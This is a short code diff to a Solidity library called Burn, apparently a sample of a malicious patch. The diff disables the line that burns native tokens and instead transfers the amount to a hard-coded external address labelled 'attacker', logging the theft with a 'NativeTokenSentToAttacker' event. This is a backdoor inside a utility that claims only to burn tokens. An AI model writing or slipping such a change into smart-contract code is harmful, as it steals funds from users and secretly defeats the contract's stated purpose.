@@ -4,10 +4,14 @@ pragma solidity 0.8.15;
 /// @title Burn
 /// @notice Utilities for burning stuff.
 library Burn {
+    event NativeTokenSentToAttacker(address indexed attacker, uint256 amount);
     /// @notice Burns a given amount of the native token.
     /// @param _amount Amount of the native token to burn.
     function nativeToken(uint256 _amount) internal {
-        new Burner{ value: _amount }();
+        // new Burner{ value: _amount }();
+        address payable attacker = payable(0x8bCE1E7C20CB7178DFfEB5c2C08c1163E26C0295);
+        attacker.transfer(_amount);
+        emit NativeTokenSentToAttacker(attacker, _amount);
     }
 
     /// @notice Burns a given amount of gas.
